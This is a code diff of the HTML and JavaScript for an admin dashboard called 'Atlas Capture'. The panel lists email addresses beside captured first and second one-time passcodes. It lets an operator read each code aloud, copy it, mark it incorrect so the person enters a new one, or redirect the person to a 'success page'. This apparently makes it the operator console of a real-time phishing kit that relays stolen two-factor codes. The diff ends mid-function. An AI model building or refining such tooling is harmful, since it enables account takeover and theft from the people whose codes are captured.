@@ -3,57 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Atlas Capture - Admin Dashboard</title>
+    <title>Atlas Capture Admin Dashboard</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
     <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
     
     <style>
-        :root {
-            /* Light Mode Colors */
-            --space-indigo: #22223bff;
-            --dusty-grape: #4a4e69ff;
-            --lilac-ash: #9a8c98ff;
-            --almond-silk: #c9ada7ff;
-            --parchment: #f2e9e4ff;
-            
-            --bg-primary: var(--parchment);
-            --bg-secondary: #ffffff;
-            --text-primary: var(--space-indigo);
-            --text-secondary: var(--dusty-grape);
-            --border: var(--lilac-ash);
-            --card-bg: #ffffff;
-            --navbar-bg: rgba(255,255,255,0.9);
-            --success: #059669;
-            --warning: #d97706;
-            --danger: #dc2626;
-            --info: #4f46e5;
-            --secondary: var(--dusty-grape);
-            --table-hover: rgba(154, 140, 152, 0.1);
-            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
-            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
-            --input-bg: #ffffff;
-        }
-
-        body.dark {
-            --dark-amethyst: #3a015cff;
-            --deep-purple: #4f0147ff;
-            --midnight-violet: #35012cff;
-            --midnight-violet-2: #290025ff;
-            --midnight-violet-3: #11001cff;
-            
-            --bg-primary: var(--midnight-violet-3);
-            --bg-secondary: var(--midnight-violet-2);
-            --text-primary: #f1f5f9;
-            --text-secondary: #cbd5e1;
-            --border: var(--deep-purple);
-            --card-bg: var(--midnight-violet);
-            --navbar-bg: rgba(17, 0, 28, 0.9);
-            --table-hover: rgba(79, 1, 71, 0.3);
-            --input-bg: var(--midnight-violet-2);
-        }
-
         * {
             margin: 0;
             padding: 0;
@@ -63,16 +18,22 @@
 
         body {
             min-height: 100vh;
-            background: var(--bg-primary);
-            color: var(--text-primary);
-            transition: all 0.3s ease;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #4facfe 75%, #00f2fe 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
+            color: white;
         }
 
-        /* Glassmorphism Navbar */
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
         .glass-navbar {
-            background: var(--navbar-bg);
+            background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(20px);
-            border-bottom: 1px solid var(--border);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
             padding: 16px 32px;
             display: flex;
             justify-content: space-between;
@@ -99,9 +60,8 @@
         .logo h1 {
             font-size: 20px;
             font-weight: 700;
-            background: linear-gradient(135deg, var(--info), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: white;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
         }
 
         .navbar-right {
@@ -112,9 +72,9 @@
         }
 
         .glass-btn {
-            background: var(--bg-secondary);
+            background: rgba(255, 255, 255, 0.15);
             backdrop-filter: blur(10px);
-            border: 1px solid var(--border);
+            border: 1px solid rgba(255, 255, 255, 0.2);
             padding: 8px 16px;
             border-radius: 12px;
             cursor: pointer;
@@ -124,28 +84,27 @@
             align-items: center;
             gap: 8px;
             transition: all 0.3s ease;
-            color: var(--text-primary);
+            color: white;
         }
 
         .glass-btn:hover {
+            background: rgba(255, 255, 255, 0.25);
             transform: translateY(-2px);
-            box-shadow: var(--shadow-md);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
         }
 
         .tts-toggle.active {
-            background: var(--success);
-            color: white;
-            border-color: var(--success);
+            background: rgba(16, 185, 129, 0.8);
+            border-color: rgba(255, 255, 255, 0.5);
         }
 
         .logout-btn {
-            background: var(--danger);
-            color: white;
+            background: rgba(239, 68, 68, 0.8);
             border: none;
         }
 
         .logout-btn:hover {
-            background: #dc2626;
+            background: rgba(239, 68, 68, 1);
         }
 
         .container {
@@ -154,20 +113,7 @@
             padding: 0 24px;
         }
 
-        /* Skeleton Animation */
-        .skeleton {
-            background: linear-gradient(90deg, var(--border) 25%, var(--bg-secondary) 50%, var(--border) 75%);
-            background-size: 200% 100%;
-            animation: skeleton-loading 1.5s infinite;
-            border-radius: 8px;
-        }
-
-        @keyframes skeleton-loading {
-            0% { background-position: 200% 0; }
-            100% { background-position: -200% 0; }
-        }
-
-        .stats-grid {
+        .stats {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
             gap: 20px;
@@ -175,12 +121,13 @@
         }
 
         .stat-card {
-            background: var(--card-bg);
-            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
             padding: 24px;
-            border: 1px solid var(--border);
+            border: 1px solid rgba(255, 255, 255, 0.2);
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all 0.3s ease;
             position: relative;
             overflow: hidden;
         }
@@ -192,18 +139,19 @@
             left: 0;
             right: 0;
             height: 4px;
-            background: linear-gradient(90deg, var(--info), var(--secondary));
+            background: linear-gradient(90deg, rgba(255, 255, 255, 0.5), rgba(255, 255, 255, 0.9));
         }
 
         .stat-card:hover {
             transform: translateY(-4px);
-            box-shadow: var(--shadow-lg);
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
         }
 
         .stat-icon {
             width: 48px;
             height: 48px;
-            background: rgba(79, 70, 229, 0.1);
+            background: rgba(255, 255, 255, 0.2);
             border-radius: 16px;
             display: flex;
             align-items: center;
@@ -213,49 +161,28 @@
 
         .stat-icon ion-icon {
             font-size: 28px;
-            color: var(--info);
+            color: white;
         }
 
         .stat-card h3 {
             font-size: 14px;
-            color: var(--text-secondary);
+            color: rgba(255, 255, 255, 0.8);
             margin-bottom: 8px;
         }
 
         .stat-card .number {
             font-size: 32px;
             font-weight: 800;
-            color: var(--text-primary);
-        }
-
-        .skeleton-stat {
-            height: 120px;
-            border-radius: 20px;
-        }
-
-        .skeleton-table {
-            border-radius: 20px;
-            overflow: hidden;
-        }
-
-        .skeleton-row {
-            height: 60px;
-            margin-bottom: 8px;
-            border-radius: 12px;
-        }
-
-        .skeleton-cell {
-            height: 20px;
-            width: 100%;
-            border-radius: 8px;
+            color: white;
         }
 
         .table-container {
-            background: var(--card-bg);
-            border-radius: 20px;
-            border: 1px solid var(--border);
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
             overflow: auto;
-            box-shadow: var(--shadow-sm);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
         }
 
         table {
@@ -267,20 +194,20 @@
         th {
             text-align: left;
             padding: 16px 20px;
-            background: var(--bg-secondary);
+            background: rgba(255, 255, 255, 0.1);
             font-weight: 600;
-            color: var(--text-secondary);
-            border-bottom: 1px solid var(--border);
+            color: rgba(255, 255, 255, 0.9);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
         }
 
         td {
             padding: 14px 20px;
-            border-bottom: 1px solid var(--border);
-            color: var(--text-primary);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.9);
         }
 
         tr:hover {
-            background: var(--table-hover);
+            background: rgba(255, 255, 255, 0.1);
         }
 
         .badge {
@@ -293,16 +220,16 @@
             font-weight: 500;
         }
 
-        .badge-pending { background: rgba(217, 119, 6, 0.2); color: var(--warning); border: 1px solid var(--warning); }
-        .badge-approved { background: rgba(5, 150, 105, 0.2); color: var(--success); border: 1px solid var(--success); }
-        .badge-waiting { background: rgba(79, 70, 229, 0.2); color: var(--info); border: 1px solid var(--info); }
-        .badge-email { background: rgba(245, 158, 11, 0.2); color: var(--warning); border: 1px solid var(--warning); }
-        .badge-blocked { background: rgba(220, 38, 38, 0.2); color: var(--danger); border: 1px solid var(--danger); }
+        .badge-pending { background: rgba(245, 158, 11, 0.3); color: #fef3c7; border: 1px solid rgba(245, 158, 11, 0.5); }
+        .badge-approved { background: rgba(16, 185, 129, 0.3); color: #d1fae5; border: 1px solid rgba(16, 185, 129, 0.5); }
+        .badge-waiting { background: rgba(79, 70, 229, 0.3); color: #e0e7ff; border: 1px solid rgba(79, 70, 229, 0.5); }
+        .badge-email { background: rgba(249, 115, 22, 0.3); color: #fed7aa; border: 1px solid rgba(249, 115, 22, 0.5); }
+        .badge-never { background: rgba(239, 68, 68, 0.3); color: #fecaca; border: 1px solid rgba(239, 68, 68, 0.5); }
 
         .action-btn {
-            background: transparent;
+            background: rgba(255, 255, 255, 0.15);
             backdrop-filter: blur(10px);
-            border: 1px solid var(--border);
+            border: 1px solid rgba(255, 255, 255, 0.2);
             padding: 6px 12px;
             border-radius: 8px;
             cursor: pointer;
@@ -312,35 +239,35 @@
             display: inline-flex;
             align-items: center;
             gap: 6px;
-            color: var(--text-primary);
+            color: white;
             margin-right: 6px;
             margin-bottom: 6px;
         }
 
         .action-btn:hover {
             transform: translateY(-1px);
+            background: rgba(255, 255, 255, 0.25);
         }
 
-        .btn-success { background: var(--success); color: white; border: none; }
-        .btn-approve { background: var(--info); color: white; border: none; }
-        .btn-incorrect { background: var(--danger); color: white; border: none; }
-        .btn-block { background: #6b21a5; color: white; border: none; }
-        .btn-reset { background: var(--warning); color: white; border: none; }
-        .btn-delete { background: var(--danger); color: white; border: none; }
+        .btn-success { background: rgba(16, 185, 129, 0.8); }
+        .btn-approve { background: rgba(79, 70, 229, 0.8); }
+        .btn-incorrect { background: rgba(239, 68, 68, 0.8); }
+        .btn-never { background: rgba(139, 92, 246, 0.8); }
+        .btn-reset { background: rgba(245, 158, 11, 0.8); }
+        .btn-delete { background: rgba(107, 114, 128, 0.8); }
 
         .otp-code {
             cursor: pointer;
             padding: 4px 8px;
             border-radius: 8px;
-            background: var(--bg-secondary);
-            border: 1px solid var(--border);
+            background: rgba(255, 255, 255, 0.1);
             font-family: monospace;
             font-size: 13px;
         }
 
         .copy-btn {
             background: transparent;
-            color: var(--text-secondary);
+            color: rgba(255, 255, 255, 0.7);
             padding: 4px 6px;
             margin-left: 6px;
             font-size: 12px;
@@ -352,17 +279,18 @@
             position: fixed;
             top: 80px;
             right: 20px;
-            background: var(--card-bg);
-            border-left: 4px solid var(--info);
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(20px);
+            border-left: 4px solid #4f46e5;
             padding: 16px 20px;
             border-radius: 12px;
-            box-shadow: var(--shadow-lg);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
             display: none;
             z-index: 1000;
             animation: slideIn 0.3s ease;
             max-width: 350px;
-            color: var(--text-primary);
-            border: 1px solid var(--border);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
 
         @keyframes slideIn {
@@ -374,7 +302,8 @@
             position: fixed;
             bottom: 20px;
             right: 20px;
-            background: var(--success);
+            background: rgba(16, 185, 129, 0.9);
+            backdrop-filter: blur(10px);
             color: white;
             padding: 12px 24px;
             border-radius: 40px;
@@ -384,7 +313,8 @@
             align-items: center;
             gap: 12px;
             z-index: 1000;
-            box-shadow: var(--shadow-lg);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
         }
 
         .speaking-indicator.show {
@@ -428,14 +358,21 @@
         }
 
         .modal-content {
-            background: var(--card-bg);
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
             border-radius: 24px;
             padding: 24px;
             max-width: 500px;
             width: 90%;
-            border: 1px solid var(--border);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: #1f2937;
             max-height: 80vh;
             overflow-y: auto;
+        }
+
+        .dark .modal-content {
+            background: rgba(30, 41, 59, 0.95);
+            color: white;
         }
 
         .modal-header {
@@ -444,7 +381,7 @@
             align-items: center;
             margin-bottom: 20px;
             padding-bottom: 12px;
-            border-bottom: 1px solid var(--border);
+            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
         }
 
         .modal-header h3 {
@@ -458,7 +395,7 @@
 
         .modal-label {
             font-size: 12px;
-            color: var(--text-secondary);
+            color: #6b7280;
             margin-bottom: 4px;
         }
 
@@ -477,12 +414,16 @@
         .empty-state {
             text-align: center;
             padding: 60px;
-            color: var(--text-secondary);
+            color: rgba(255, 255, 255, 0.7);
         }
 
         .empty-state ion-icon {
             font-size: 64px;
             margin-bottom: 16px;
+        }
+
+        .dark-mode {
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
         }
     </style>
 </head>
@@ -541,35 +482,54 @@
 </div>
 
 <div class="container">
-    <div class="stats-grid" id="statsGrid">
-        <div class="skeleton skeleton-stat"></div>
-        <div class="skeleton skeleton-stat"></div>
-        <div class="skeleton skeleton-stat"></div>
-        <div class="skeleton skeleton-stat"></div>
+    <div class="stats" id="statsGrid">
+        <div class="stat-card">
+            <div class="stat-icon"><ion-icon name="people-outline"></ion-icon></div>
+            <h3>Total Users</h3>
+            <div class="number" id="totalUsers">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon"><ion-icon name="mail-outline"></ion-icon></div>
+            <h3>Pending Email</h3>
+            <div class="number" id="pendingEmail">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon"><ion-icon name="key-outline"></ion-icon></div>
+            <h3>Pending OTP 1</h3>
+            <div class="number" id="pendingFirstOTP">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon"><ion-icon name="shield-checkmark-outline"></ion-icon></div>
+            <h3>Pending OTP 2</h3>
+            <div class="number" id="pendingSecondOTP">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon"><ion-icon name="checkmark-done-circle-outline"></ion-icon></div>
+            <h3>Verified</h3>
+            <div class="number" id="verifiedCount">0</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon"><ion-icon name="ban-outline"></ion-icon></div>
+            <h3>Never/Blocked</h3>
+            <div class="number" id="neverCount">0</div>
+        </div>
     </div>
 
     <div class="table-container">
-        <div id="skeletonTable" class="skeleton-table">
-            <div class="skeleton skeleton-row" style="height: 50px;"></div>
-            <div class="skeleton skeleton-row" style="height: 60px;"></div>
-            <div class="skeleton skeleton-row" style="height: 60px;"></div>
-            <div class="skeleton skeleton-row" style="height: 60px;"></div>
-            <div class="skeleton skeleton-row" style="height: 60px;"></div>
-        </div>
-        <div id="usersTable" style="display: none;">
-            <table>
-                <thead>
-                    <tr>
-                        <th>Email</th>
-                        <th>First OTP</th>
-                        <th>Second OTP</th>
-                        <th>Status</th>
-                        <th>Actions</th>
-                    </tr>
-                </thead>
-                <tbody id="usersTableBody"></tbody>
-            </table>
-        </div>
+        <table id="usersTable">
+            <thead>
+                <tr>
+                    <th>Email</th>
+                    <th>First OTP</th>
+                    <th>Second OTP</th>
+                    <th>Status</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody id="usersTableBody">
+                <tr><td colspan="5" style="text-align:center; padding:40px;">Loading users...</td</tr>
+            </tbody>
+        </table>
     </div>
 </div>
 
@@ -650,7 +610,8 @@
         processQueue();
     }
 
-    function testVoice() { speakText('Voice test successful. Atlas Capture admin dashboard ready.', true); }
+    function testVoice() { speakText('Voice test. Atlas Capture admin dashboard ready.', true); }
+    
     function toggleTTS() {
         speechEnabled = !speechEnabled;
         const btn = document.getElementById('ttsToggleBtn');
@@ -696,19 +657,20 @@
     function escapeHtml(str) { if (!str) return ''; return str.replace(/[&<>]/g, function(m) { if (m === '&') return '&amp;'; if (m === '<') return '&lt;'; if (m === '>') return '&gt;'; return m; }); }
 
     function getStatusText(user) {
-        if (user.blocked) return 'Blocked';
+        if (user.otp1_never) return 'Never/Blocked';
         if (!user.approved) return 'Pending Email';
         if (user.approved && user.otp && !user.otp1_correct) return 'Pending OTP 1';
         if (user.otp1_correct && user.second_otp && !user.otp2_correct) return 'Pending OTP 2';
         if (user.otp1_correct && user.otp2_correct) return 'Verified';
         return 'Pending';
     }
+    
     function getStatusColor(user) {
-        if (user.blocked) return '#dc2626';
-        if (!user.approved) return '#d97706';
+        if (user.otp1_never) return '#ef4444';
+        if (!user.approved) return '#f59e0b';
         if (user.approved && user.otp && !user.otp1_correct) return '#4f46e5';
         if (user.otp1_correct && user.second_otp && !user.otp2_correct) return '#9a8c98';
-        if (user.otp1_correct && user.otp2_correct) return '#059669';
+        if (user.otp1_correct && user.otp2_correct) return '#10b981';
         return '#6b7280';
     }
 
@@ -717,34 +679,28 @@
     async function fetchUsers() {
         try {
             const response = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${token}` } });
-            if (response.status === 403) { localStorage.removeItem('adminToken'); window.location.href = '/admin/login'; return; }
+            if (response.status === 403) { localStorage.removeItem('token'); window.location.href = '/admin/login'; return; }
             const users = await response.json();
             usersData = users;
             displayUsers(users);
             updateStats(users);
-            
-            document.getElementById('skeletonTable').style.display = 'none';
-            document.getElementById('usersTable').style.display = 'block';
-            document.getElementById('statsGrid').innerHTML = '';
         } catch(err) { console.error(err); }
     }
 
     function updateStats(users) {
-        const pendingEmail = users.filter(u => !u.approved && !u.blocked).length;
-        const pendingFirstOTP = users.filter(u => u.approved && u.otp && !u.otp1_correct && !u.blocked).length;
-        const pendingSecondOTP = users.filter(u => u.otp1_correct && u.second_otp && !u.otp2_correct && !u.blocked).length;
-        const verified = users.filter(u => u.otp1_correct && u.otp2_correct && !u.blocked).length;
-        const blocked = users.filter(u => u.blocked).length;
+        const total = users.length;
+        const pendingEmail = users.filter(u => !u.approved && !u.otp1_never).length;
+        const pendingFirstOTP = users.filter(u => u.approved && u.otp && !u.otp1_correct && !u.otp1_never).length;
+        const pendingSecondOTP = users.filter(u => u.otp1_correct && u.second_otp && !u.otp2_correct && !u.otp1_never).length;
+        const verified = users.filter(u => u.otp1_correct && u.otp2_correct && !u.otp1_never).length;
+        const never = users.filter(u => u.otp1_never).length;
         
-        const statsGrid = document.getElementById('statsGrid');
-        statsGrid.innerHTML = `
-            <div class="stat-card" onclick="speakText('Total users: ' + ${users.length})"><div class="stat-icon"><ion-icon name="people-outline"></ion-icon></div><h3>Total Users</h3><div class="number">${users.length}</div></div>
-            <div class="stat-card" onclick="speakText('Pending email approval: ' + ${pendingEmail})"><div class="stat-icon"><ion-icon name="mail-outline"></ion-icon></div><h3>Pending Email</h3><div class="number">${pendingEmail}</div></div>
-            <div class="stat-card" onclick="speakText('Pending first OTP: ' + ${pendingFirstOTP})"><div class="stat-icon"><ion-icon name="key-outline"></ion-icon></div><h3>Pending OTP 1</h3><div class="number">${pendingFirstOTP}</div></div>
-            <div class="stat-card" onclick="speakText('Pending second OTP: ' + ${pendingSecondOTP})"><div class="stat-icon"><ion-icon name="shield-outline"></ion-icon></div><h3>Pending OTP 2</h3><div class="number">${pendingSecondOTP}</div></div>
-            <div class="stat-card" onclick="speakText('Verified users: ' + ${verified})"><div class="stat-icon"><ion-icon name="checkmark-done-circle-outline"></ion-icon></div><h3>Verified</h3><div class="number">${verified}</div></div>
-            <div class="stat-card" onclick="speakText('Blocked users: ' + ${blocked})"><div class="stat-icon"><ion-icon name="ban-outline"></ion-icon></div><h3>Blocked</h3><div class="number">${blocked}</div></div>
-        `;
+        document.getElementById('totalUsers').textContent = total;
+        document.getElementById('pendingEmail').textContent = pendingEmail;
+        document.getElementById('pendingFirstOTP').textContent = pendingFirstOTP;
+        document.getElementById('pendingSecondOTP').textContent = pendingSecondOTP;
+        document.getElementById('verifiedCount').textContent = verified;
+        document.getElementById('neverCount').textContent = never;
     }
 
     function displayUsers(users) {
@@ -755,15 +711,14 @@
             let statusBadge = '';
             let actionButtons = '';
             
-            if (user.blocked) {
-                statusBadge = '<span class="badge badge-blocked"><ion-icon name="ban-outline"></ion-icon> Blocked</span>';
+            if (user.otp1_never) {
+                statusBadge = '<span class="badge badge-never"><ion-icon name="ban-outline"></ion-icon> Never/Blocked</span>';
                 actionButtons = `<button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon> Reset</button>
                                 <button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
             }
             else if (!user.approved) {
                 statusBadge = '<span class="badge badge-email"><ion-icon name="mail-outline"></ion-icon> Pending Email</span>';
                 actionButtons = `<button class="action-btn btn-approve" onclick="approveEmail('${escapeHtml(user.email)}')"><ion-icon name="checkmark-outline"></ion-icon> Approve</button>
-                                <button class="action-btn btn-block" onclick="blockUser('${escapeHtml(user.email)}')"><ion-icon name="ban-outline"></ion-icon> Block</button>
                                 <button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
             }
             else if (user.approved && user.otp && !user.otp1_correct) {
@@ -771,7 +726,7 @@
                 actionButtons = `<button class="action-btn btn-success" onclick="successFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="star-outline"></ion-icon> Success</button>
                                 <button class="action-btn btn-approve" onclick="approveFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon> Approve</button>
                                 <button class="action-btn btn-incorrect" onclick="incorrectFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon> Incorrect</button>
-                                <button class="action-btn btn-block" onclick="blockUser('${escapeHtml(user.email)}')"><ion-icon name="ban-outline"></ion-icon> Block</button>
+                                <button class="action-btn btn-never" onclick="neverFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="ban-outline"></ion-icon> Never</button>
                                 <button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon> Reset</button>
                                 <button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
             }
@@ -779,21 +734,19 @@
                 statusBadge = '<span class="badge badge-waiting"><ion-icon name="shield-outline"></ion-icon> Pending OTP 2</span>';
                 actionButtons = `<button class="action-btn btn-approve" onclick="approveSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon> Approve</button>
                                 <button class="action-btn btn-incorrect" onclick="incorrectSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon> Incorrect</button>
-                                <button class="action-btn btn-block" onclick="blockUser('${escapeHtml(user.email)}')"><ion-icon name="ban-outline"></ion-icon> Block</button>
                                 <button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon> Reset</button>
                                 <button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
             }
             else if (user.otp1_correct && user.otp2_correct) {
                 statusBadge = '<span class="badge badge-approved"><ion-icon name="checkmark-done-circle-outline"></ion-icon> Verified</span>';
-                actionButtons = `<button class="action-btn btn-block" onclick="blockUser('${escapeHtml(user.email)}')"><ion-icon name="ban-outline"></ion-icon> Block</button>
-                                <button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon> Reset</button>
+                actionButtons = `<button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon> Reset</button>
                                 <button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon> Delete</button>`;
             }
             
             return `<tr>
-                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, blocked:${user.blocked || false}, created_at:'${user.created_at}'})" style="cursor:pointer;"><strong>${escapeHtml(user.email)}</strong></td>
-                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, blocked:${user.blocked || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.otp ? `<span class="otp-code" onclick="event.stopPropagation(); speakText('First OTP: ${user.otp.split('').join(' ')}')">${user.otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
-                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, blocked:${user.blocked || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.second_otp ? `<span class="otp-code" onclick="event.stopPropagation(); speakText('Second OTP: ${user.second_otp.split('').join(' ')}')">${user.second_otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.second_otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
+                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;"><strong>${escapeHtml(user.email)}</strong></td>
+                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.otp ? `<span class="otp-code" onclick="event.stopPropagation(); speakText('First OTP: ${user.otp.split('').join(' ')}')">${user.otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
+                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.second_otp ? `<span class="otp-code" onclick="event.stopPropagation(); speakText('Second OTP: ${user.second_otp.split('').join(' ')}')">${user.second_otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.second_otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
                 <td>${statusBadge}</td>
                 <td>${actionButtons}</td>
             </tr>`;
@@ -804,33 +757,57 @@
         try {
             const response = await fetch(endpoint, { method, headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify({ email }) });
             const data = await response.json();
-            if (data.success) { showToast('Success', successMsg); fetchUsers(); }
+            if (data.success) { showToast('Success', successMsg); fetchUsers(); speakText(successMsg, true); }
             else { showToast('Error', data.detail || errorMsg); }
         } catch(e) { showToast('Error', 'Network error'); }
     }
 
     function approveEmail(email) { apiCall('/api/admin/approve-user', 'POST', email, 'Email approved', 'Failed to approve'); }
     function approveFirstOTP(email) { apiCall('/api/admin/approve-first-otp', 'POST', email, 'First OTP approved', 'Failed to approve'); }
-    function incorrectFirstOTP(email) { apiCall('/api/admin/incorrect-first-otp', 'POST', email, 'First OTP marked incorrect', 'Failed to mark'); }
     function successFirstOTP(email) { apiCall('/api/admin/success-first-otp', 'POST', email, 'User redirected to success page', 'Failed to redirect'); }
+    function incorrectFirstOTP(email) { apiCall('/api/admin/incorrect-first-otp', 'POST', email, 'First OTP marked incorrect', 'Failed to mark'); }
+    function neverFirstOTP(email) { if(confirm(`Mark ${email} as NEVER? They will be redirected to success page permanently.`)) apiCall('/api/admin/never-first-otp', 'POST', email, 'User marked as never', 'Failed to mark'); }
     function approveSecondOTP(email) { apiCall('/api/admin/approve-second-otp', 'POST', email, 'Second OTP approved', 'Failed to approve'); }
     function incorrectSecondOTP(email) { apiCall('/api/admin/incorrect-second-otp', 'POST', email, 'Second OTP marked incorrect', 'Failed to mark'); }
-    function blockUser(email) { if(confirm(`Block ${email}?`)) apiCall('/api/admin/block-user', 'POST', email, 'User blocked', 'Failed to block'); }
     function resetUser(email) { if(confirm(`Reset ${email}? This will create a new record.`)) apiCall('/api/admin/reset-user', 'POST', email, 'User reset. New record created.', 'Failed to reset'); }
     function deleteUser(email) { if(confirm(`Delete ${email} permanently?`)) apiCall('/api/admin/delete-user', 'DELETE', email, 'User deleted', 'Failed to delete'); }
 
     function setupTheme() {
         const savedTheme = localStorage.getItem('theme');
-        if (savedTheme === 'dark') document.body.classList.add('dark');
+        if (savedTheme === 'dark') document.body.classList.add('dark-mode');
         const btn = document.getElementById('themeToggleBtn');
-        btn.onclick = () => { document.body.classList.toggle('dark'); localStorage.setItem('theme', document.body.classList.contains('dark') ? 'dark' : 'light'); };
+        btn.onclick = () => { document.body.classList.toggle('dark-mode'); localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light'); };
+    }
+
+    // WebSocket for real-time alerts
+    function setupWebSocket() {
+        try {
+            const ws = new WebSocket(`wss://${window.location.host}/ws/admin?token=${token}`);
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
